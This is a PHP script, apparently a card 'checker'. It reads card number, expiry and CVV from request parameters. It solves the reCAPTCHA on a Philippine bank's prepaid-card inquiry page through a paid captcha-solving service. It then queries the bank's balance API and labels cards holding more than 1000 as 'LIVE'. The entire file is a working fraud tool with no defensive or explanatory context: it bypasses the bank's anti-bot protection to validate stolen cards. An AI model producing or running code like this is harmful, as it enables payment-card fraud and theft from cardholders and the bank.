<?php
	error_reporting(0); 

	include("anticaptcha.php");
	include("nocaptchaproxyless.php");

	function GetStr($string, $start, $end){ 
	    $str = explode($start, $string); 
	    $str = explode($end, $str[1]); 
	    return $str[0]; 
	}

	extract($_GET);
	$separator = explode("|", $lista);  
	$cc = $separator[0]; 
	$mm = $separator[1]; 
	$yy = $separator[2]; 
	$cvv = $separator[3];

	$api = new NoCaptchaProxyless();
	$api->setVerboseMode(true);

	//your anti-captcha.com account key
	$api->setKey("PUT YOUR ANTI-CAPTCHA API KEY HERE");

	$api->setWebsiteURL("https://online.bpi.com.ph/portalserver/onlinebanking/prepaid-card-inquiry");

	//recaptcha key
	$api->setWebsiteKey("6Leq1MQUAAAAACKtC3mnuHNupBZZAAuf6PobxhEU");

	//create task in API
	if (!$api->createTask()) {
	    $api->debout("API v2 send failed - ".$api->getErrorMessage(), "red");
	    return false;
	}

	$taskId = $api->getTaskId();

	//wait in a loop for max 300 seconds till task is solved
	if (!$api->waitForResult(300)) {
	    echo "could not solve captcha\n";
	} else {
	    $gResponse    =   $api->getTaskSolution();
	}


		$ch = curl_init(); 
	curl_setopt($ch, CURLOPT_URL, 'https://online.bpi.com.ph/portalserver/services/rest/v2/public/cards/prepaid/info'); 
	curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array( 
		'Accept: application/json, text/plain, */*',
		'Content-Type: application/json;charset=UTF-8',
		'Origin: https://online.bpi.com.ph',
		'Referer: https://online.bpi.com.ph/portalserver/onlinebanking/prepaid-card-inquiry',
		'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36')); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, '{"prepaidCardNumber":"'.$cc.'","reCaptcha":"'.$gResponse.'"}'); 
	$rez = curl_exec($ch);
	curl_close($ch); 

	$errorMsg = GetStr($rez, '"errorMessage":"', '"');
	$bal = GetStr($rez, '"availableBalance":"', '"');

	if($bal > 1000) { 
		echo '<tr><td><span class="badge badge-outline-success badge-pill">LIVE</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-success badge-pill">Bal: '.$bal.'</span></td></tr><br>'; 
	} elseif(strpos($rez, 'errorCode')) { 
		echo '<tr><td><span class="badge badge-outline-danger badge-pill">DEAD</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-danger badge-pill">Msg: Please enter a valid number.</span></td></tr><br>'; 
	} else { 
		echo '<tr><td><span class="badge badge-outline-danger badge-pill">DEAD</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-danger badge-pill">Bal: '.$bal.'</span></td></tr><br>';
	}
?>
